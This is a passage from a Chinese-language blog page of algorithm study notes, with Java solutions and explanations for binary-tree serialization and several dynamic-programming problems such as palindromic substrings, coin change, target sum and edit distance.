+= recursionPathSum(node.left, target, currSum);</span><br><span class="line">     res += recursionPathSum(node.right, target, currSum);</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 4.回到本层，恢复状态，去除当前节点的前缀和数量</span></span><br><span class="line">     prefixSumCount.put(currSum, prefixSumCount.get(currSum) - <span class="number">1</span>);</span><br><span class="line">     <span class="keyword">return</span> res;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="5-17-二叉树的序列化和反序列化"><a href="#5-17-二叉树的序列化和反序列化" class="headerlink" title="5.17 二叉树的序列化和反序列化"></a>5.17 二叉树的序列化和反序列化</h2><p>同剑指offer序列化二叉树</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Codec</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Encodes a tree to a single string.</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">serialize</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[]&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder(<span class="string">&quot;[&quot;</span>);</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;()&#123;&#123;add(root);&#125;&#125;;</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            TreeNode node = queue.poll();</span><br><span class="line">            <span class="keyword">if</span>(node != <span class="keyword">null</span>)&#123;</span><br><span class="line">                res.append(node.val + <span class="string">&quot;,&quot;</span>);</span><br><span class="line">                queue.add(node.left);</span><br><span class="line">                queue.add(node.right);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                res.append(<span class="string">&quot;null,&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        res.deleteCharAt(res.length() - <span class="number">1</span>);</span><br><span class="line">        res.append(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Decodes your encoded data to tree.</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">deserialize</span><span class="params">(String data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(data.equals(<span class="string">&quot;[]&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] vals = data.substring(<span class="number">1</span>, data.length() - <span class="number">1</span>).split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        TreeNode root = <span class="keyword">new</span> TreeNode(Integer.parseInt(vals[<span class="number">0</span>]));</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;()&#123;&#123;add(root);&#125;&#125;;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            TreeNode node = queue.poll();</span><br><span class="line">            <span class="keyword">if</span>(!vals[i].equals(<span class="string">&quot;null&quot;</span>))&#123;</span><br><span class="line">                node.left = <span class="keyword">new</span> TreeNode(Integer.parseInt(vals[i]));</span><br><span class="line">                queue.add(node.left);</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">if</span>(!vals[i].equals(<span class="string">&quot;null&quot;</span>))&#123;</span><br><span class="line">                node.right = <span class="keyword">new</span> TreeNode(Integer.parseInt(vals[i]));</span><br><span class="line">                queue.add(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="6-动态规划"><a href="#6-动态规划" class="headerlink" title="6. 动态规划"></a>6. 动态规划</h1><h2 id="6-1-回文子串"><a href="#6-1-回文子串" class="headerlink" title="6.1 回文子串"></a>6.1 回文子串</h2><p>暴力解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">countSubstrings</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">       <span class="comment">//循环所有子串</span></span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; s.length();i++)&#123;</span><br><span class="line">           <span class="keyword">for</span>(<span class="keyword">int</span> j = i;j &lt; s.length();j++)&#123;</span><br><span class="line">               <span class="keyword">if</span>(isCycle(s.substring(i, j + <span class="number">1</span>)))&#123;</span><br><span class="line">                   res++;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//判断子串是否为回文子串</span></span><br><span class="line">   <span class="function"><span class="keyword">boolean</span> <span class="title">isCycle</span><span class="params">(String str)</span></span>&#123;</span><br><span class="line">       <span class="keyword">int</span> length = str.length() - <span class="number">1</span>;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; length;i++)&#123;</span><br><span class="line">           <span class="keyword">if</span>(str.charAt(i)!= str.charAt(length-i))&#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>时间复杂度$O(n^3)$，空间复杂度O(1)</p><p>动态规划：</p><p>符合动态规划吗？</p><ul><li>存在重叠子问题<ul><li>比如abbc这个字符串，判断bb和abbc存在重叠</li></ul></li><li>子问题存在最优子结构<ul><li>子串里面也有回文子串</li></ul></li><li>是穷举求最值的问题<ul><li>需要穷举子串，因为每个字符都会被视为一个子串</li></ul></li></ul><p>根据子问题与子问题的关系写出状态转移方程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//dp[i][j]代表i开始j结尾的子串是否是回文子串</span></span><br><span class="line"><span class="keyword">if</span>(s.charAt(i) == s.charAt(j) &amp;&amp; ((j - i &lt; <span class="number">2</span>) || (dp[i+<span class="number">1</span>][j-<span class="number">1</span>])))&#123;</span><br><span class="line">    dp[i][j] = <span class="keyword">true</span>;</span><br><span class="line">    res++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$dp[i][j]$：$dp[i][j]$代表i开始j结尾的子串是否是回文子串</p><p>初始化：当j-i&lt;2时$dp[i][j]$为true</p><p>注意遍历方向：</p><p>dp$[i + 1][j - 1]$ 在 $dp[i][j]$的左下角，如图：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/1611220396-SMuRcS-file_1611220396509" alt="647.回文子串" style="zoom:50%;" /></p><p><strong>所以一定要从下到上，从左到右遍历，这样保证$dp[i + 1][j - 1]$都是经过计算的</strong>。</p><p>又因为需要依赖初值$j - i &lt; 2$，所以遍历下半部分</p><p>最终代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">countSubstrings</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> n = s.length();</span><br><span class="line">       <span class="keyword">if</span>(n == <span class="number">0</span>)&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">boolean</span>[][] dp = <span class="keyword">new</span> <span class="keyword">boolean</span>[n][n];</span><br><span class="line">    <span class="comment">//状态转移，遍历方向为下半部分</span></span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i = n - <span class="number">1</span>;i &gt;= <span class="number">0</span>;i--)&#123;</span><br><span class="line">           <span class="keyword">for</span>(<span class="keyword">int</span> j = i;j &lt; n;j++)&#123;</span><br><span class="line">               <span class="keyword">if</span>(s.charAt(i) == s.charAt(j) &amp;&amp; ((j - i &lt; <span class="number">2</span>) || (dp[i+<span class="number">1</span>][j-<span class="number">1</span>])))&#123;</span><br><span class="line">                   dp[i][j] = <span class="keyword">true</span>;</span><br><span class="line">                   res++;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="6-2-最长回文子串"><a href="#6-2-最长回文子串" class="headerlink" title="6.2 最长回文子串"></a>6.2 最长回文子串</h2><p>动态规划的条件：</p><ul><li>存在重叠子问题<ul><li>最长回文子串的子串也是回文子串</li></ul></li><li>最优子结构<ul><li>最长</li></ul></li><li>穷举求最值问题</li></ul><p>代码同 回文子串 ，在记录结果时有不同：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">longestPalindrome</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = s.length();</span><br><span class="line">    String res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">boolean</span>[][] dp = <span class="keyword">new</span> <span class="keyword">boolean</span>[n][n];</span><br><span class="line"> <span class="comment">//状态转移，遍历方向为下半部分</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = n - <span class="number">1</span>;i &gt;= <span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = i;j &lt; n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s.charAt(i) == s.charAt(j) &amp;&amp; ((j - i &lt; <span class="number">2</span>) || (dp[i+<span class="number">1</span>][j-<span class="number">1</span>])))&#123;</span><br><span class="line">                dp[i][j] = <span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">if</span>(j - i + <span class="number">1</span> &gt; res.length())&#123;</span><br><span class="line">                    res = s.substring(i,j+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-3-零钱兑换"><a href="#6-3-零钱兑换" class="headerlink" title="6.3 零钱兑换"></a>6.3 零钱兑换</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">coinChange</span><span class="params">(<span class="keyword">int</span>[] coins, <span class="keyword">int</span> amount)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//dp[i]含义是金额为i的最少硬币个数</span></span><br><span class="line">        <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[amount + <span class="number">1</span>];</span><br><span class="line">        Arrays.fill(dp,amount + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//初始化</span></span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//状态转移</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; amount + <span class="number">1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; coins.length;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(coins[j] &gt; i)&#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                dp[i] = Math.min(dp[i],dp[i - coins[j]] + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[amount] == amount + <span class="number">1</span> ? -<span class="number">1</span> : dp[amount];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="6-4-分割等和子集"><a href="#6-4-分割等和子集" class="headerlink" title="6.4 分割等和子集"></a>6.4 分割等和子集</h2><p>子集背包问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canPartition</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num : nums)&#123;</span><br><span class="line">            sum += num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(sum % <span class="number">2</span> == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sum = sum / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> n = nums.length;</span><br><span class="line">        <span class="comment">//dp[i][j]前i个数是否存在组合可以为j</span></span><br><span class="line">        <span class="keyword">boolean</span>[][] dp = <span class="keyword">new</span> <span class="keyword">boolean</span>[n + <span class="number">1</span>][sum + <span class="number">1</span>];</span><br><span class="line">        <span class="comment">//初始化</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt;= n;i++)&#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//状态转移</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>;j &lt;= sum;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(j - nums[i - <span class="number">1</span>] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                   dp[i][j] = dp[i - <span class="number">1</span>][j];</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    dp[i][j] = dp[i - <span class="number">1</span>][j] || dp[i - <span class="number">1</span>][j - nums[i - <span class="number">1</span>]];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n][sum];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="6-5-目标和"><a href="#6-5-目标和" class="headerlink" title="6.5 目标和"></a>6.5 目标和</h2><p>子集背包问题</p><p>与分割等和子集类似，目标和问题存在如下关系：</p><script type="math/tex; mode=display">positive - negative = target\\positive - (sum-positive) = target\\positive = (target+sum)/2</script><p>现在问题转化为寻找一个子集使得和等于$(target+sum)/2$，用背包问题描述是：</p><p><strong>给一个可装载重量为</strong> <strong><code>(target+sum)/2</code></strong> <strong>的背包和</strong> <strong><code>N</code></strong> <strong>个物品，每个物品的重量为</strong> <strong><code>nums[i]</code></strong>。现在让你装物品，存在几种装法，能够恰好将背包装满？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findTargetSumWays</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> S)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> num : nums)&#123;</span><br><span class="line">        sum += num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (sum &lt; S || (sum + S) % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sum = (S + sum) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> n = nums.length;</span><br><span class="line">    <span class="comment">//dp数组的含义是前i个数字能够凑成和为j的方案</span></span><br><span class="line">    <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>][sum + <span class="number">1</span>];</span><br><span class="line">    <span class="comment">//初始化</span></span><br><span class="line">    <span class="comment">//和为0的方案只有一种（不装）</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt;= n; i++)&#123;</span><br><span class="line">        dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//转移方程是dp[i][j] = dp[i - 1][j] + dp[i - 1][j - nums[i - 1]]</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= sum; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j &gt;= nums[i-<span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="comment">// 两种选择的结果之和</span></span><br><span class="line">                dp[i][j] = dp[i-<span class="number">1</span>][j] + dp[i-<span class="number">1</span>][j-nums[i-<span class="number">1</span>]];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 背包的空间不足，只能选择不装物品 i</span></span><br><span class="line">                dp[i][j] = dp[i-<span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n][sum];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-6-零钱兑换Ⅱ"><a href="#6-6-零钱兑换Ⅱ" class="headerlink" title="6.6 零钱兑换Ⅱ"></a>6.6 零钱兑换Ⅱ</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">change</span><span class="params">(<span class="keyword">int</span> amount, <span class="keyword">int</span>[] coins)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//dp[i]含义是金额为i的组合个数</span></span><br><span class="line">    <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[amount + <span class="number">1</span>];</span><br><span class="line">    Arrays.fill(dp,<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//初始化</span></span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//状态转移</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> coin : coins)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = coin; i &lt; amount + <span class="number">1</span>; i++)&#123;</span><br><span class="line">            dp[i] += dp[i - coin];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[amount];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-7-编辑距离"><a href="#6-7-编辑距离" class="headerlink" title="6.7 编辑距离"></a>6.7 编辑距离</h2><p>动态规划的条件：</p><ul><li>存在重叠子问题<ul><li>不同的修改方案有可能存在局部的相同修改</li></ul></li><li>最优子结构<ul><li>最少操作数</li></ul></li><li>穷举求最值问题<ul><li>修改方式很多，我们可以穷举</li></ul></li></ul><ol><li><p>定义$dp[i][j]$的含义：</p><p>以子串1中以i结尾子串和子串2中以j结尾子串的最少操作数</p></li><li><p>状态转移方程(右侧分别对应插入、删除、替换)：​</p><script type="math/tex; mode=display">dp[i][j] = \begin{cases} min(dp((i, j - 1) + 1, dp(i - 1, j) + 1),dp[i - 1][j - 1] + 1), & s1[i] != s2[j]\\dp[i - 1][j - 1],&s1[i] == s2[j]\end{cases}</script></li><li><p>初始化：</p><p>当i或j为0时，代表其中一个子串已经为空，此时直接返回另一剩余子串长度。</p></li></ol><p>自顶向下解法：</p><p>使用了备忘录，不使用备忘录会超出时间限制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">    String word1,word2;</span><br><span class="line">    <span class="keyword">int</span> dp[][];</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minDistance</span><span class="params">(String word1, String word2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.word1 = word1;</span><br><span class="line">        <span class="keyword">this</span>.word2 = word2;</span><br><span class="line">        <span class="keyword">int</span> length1 = word1.length();</span><br><span class="line">        <span class="keyword">int</span> length2 = word2.length();</span><br><span class="line">        <span class="keyword">this</span>.dp = <span class="keyword">new</span> <span class="keyword">int</span>[length1 + <span class="number">1</span>][length2 + <span class="number">1</span>];</span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt;= length1;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt;= length2;j++)&#123;</span><br><span class="line">                dp[i][j] = -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//i，j 初始化指向最后一个索引</span></span><br><span class="line">    <span class="keyword">return</span> helper(length1, length2);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">helper</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">        <span class="comment">//备忘录</span></span><br><span class="line">        <span class="keyword">if</span>(dp[i][j] &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> dp[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//base case</span></span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span> || j == <span class="number">0</span>) &#123;</span><br><span class="line">            dp[i][j] = i + j;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//状态转移</span></span><br><span class="line">            <span class="keyword">if</span>(word1.charAt(i - <span class="number">1</span>) == word2.charAt(j - <span class="number">1</span>))&#123;</span><br><span class="line">                dp[i][j] = helper(i - <span class="number">1</span>, j - <span class="number">1</span>);  <span class="comment">//啥都不做</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//插入，删除，替换</span></span><br><span class="line">                dp[i][j] =  Math.min(</span><br><span class="line">                    Math.min(helper(i, j - <span class="number">1</span>), helper(i - <span class="number">1</span>, j)),</span><br><span class="line">                    helper(i - <span class="number">1</span>, j - <span class="number">1</span>)) + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">           </span><br><span class="line">        <span class="keyword">return</span> dp[i][j];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>自底向上解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">minDistance</span><span class="params">(String s1, String s2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m = s1.length(), n = s2.length();</span><br><span class="line">    <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">    <span class="comment">// base case </span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)</span><br><span class="line">        dp[i][<span class="number">0</span>] = 